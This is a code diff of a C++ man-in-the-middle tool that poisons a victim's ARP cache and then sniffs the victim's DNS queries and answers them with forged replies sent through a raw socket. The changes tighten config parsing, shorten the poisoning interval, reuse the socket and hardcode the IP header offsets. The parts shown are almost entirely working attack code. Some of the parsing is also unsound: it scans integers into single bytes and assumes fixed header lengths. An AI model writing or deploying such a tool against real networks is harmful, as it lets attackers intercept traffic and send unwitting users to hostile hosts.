@@ -38,32 +38,23 @@ int main(int argc, const char *argv[]) {
     unsigned char *victimIpChar = (unsigned char *)&victimIp;
     unsigned char *gatewayIpChar = (unsigned char *)&gatewayIp;
 
-    if (properties.find("attackerMac") != properties.end()) {
-        std::cerr << "please set attackerMac in config file" << std::endl;
-    }
-
-    if (properties.find("victimIp") != properties.end()) {
-        std::cerr << "please set victimIp in config file" << std::endl;
-    }
-
-    if (properties.find("gatewayIp") != properties.end()) {
-        std::cerr << "please set gatewayIp in config file" << std::endl;
-    }
-
     if (sscanf(properties["attackerMac"].c_str(), "%x:%x:%x:%x:%x:%x", &attackerMac[0],
                &attackerMac[1], &attackerMac[2], &attackerMac[3], &attackerMac[4],
-               &attackerMac[5])) {
+               &attackerMac[5]) != 6) {
         std::cerr << "could not parse attackerMac" << std::endl;
+        return 0;
     }
 
     if (sscanf(properties["victimIp"].c_str(), "%d.%d.%d.%d", &victimIpChar[0], &victimIpChar[1],
-               &victimIpChar[2], &victimIpChar[3])) {
+               &victimIpChar[2], &victimIpChar[3]) != 4) {
         std::cerr << "could not parse victimIp" << std::endl;
+        return 0;
     }
 
     if (sscanf(properties["gatewayIp"].c_str(), "%d.%d.%d.%d", &gatewayIpChar[0], &gatewayIpChar[1],
-               &gatewayIpChar[2], &gatewayIpChar[3])) {
+               &gatewayIpChar[2], &gatewayIpChar[3]) != 4) {
         std::cerr << "could not parse gatewayIp" << std::endl;
+        return 0;
     }
 
     // get the mac addresses using arp
@@ -128,7 +119,7 @@ int main(int argc, const char *argv[]) {
             break;
         }
 
-        sleep(5);
+        sleep(2);
     }
 
     // start dns sniffing
@@ -223,7 +214,9 @@ void dnsSpoof(NetworkEngine *net) {
         return;
     }
 
-    pcap_loop(session, 0, &dnsGotPacket, (unsigned char *)net);
+    int rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    pcap_loop(session, 0, &dnsGotPacket, (unsigned char *)&rawSocket);
+    close(rawSocket);
 
     pcap_freealldevs(allDevs);
 }
@@ -243,29 +236,18 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     struct udphdr *udp;
     dnshdr *dns;
 
-    int ipLen = 0;
-
-    // get ip hdr size
+    // get headers
     ip = (iphdr *)(packet + 14);
-    ipLen = ip->ihl * 4;
-
-    // get udp hdr and size
-    udp = (udphdr *)(packet + 14 + ipLen);
-
-    // get dns header
-    dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
+    udp = (udphdr *)(packet + 14 + 20);
+    dns = (dnshdr *)(packet + 14 + 20 + 8);
 
     if (dns->qr == 1) {
         return;
     }
 
-    std::cout << "got query" << std::endl;
-
     if (ip->saddr != victimIp.s_addr) {
         return;
     }
-
-    std::cout << "query from target host" << std::endl;
 
     unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
     for (int i = 0; addressFilter[i]; i++) {
@@ -293,9 +275,7 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     sin.sin_family = AF_INET;
     sin.sin_port = udp->dest;
     sin.sin_addr.s_addr = ip->saddr;
-    int rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     int bytesSent =
-        sendto(rawSocket, frame, 20 + 8 + responseSize, 0, (struct sockaddr *)&sin, sizeof(sin));
-    close(rawSocket);
+        sendto(*(int *)args, frame, 20 + 8 + responseSize, 0, (struct sockaddr *)&sin, sizeof(sin));
     std::cout << "sending reply, size: " << bytesSent << std::endl;
 }
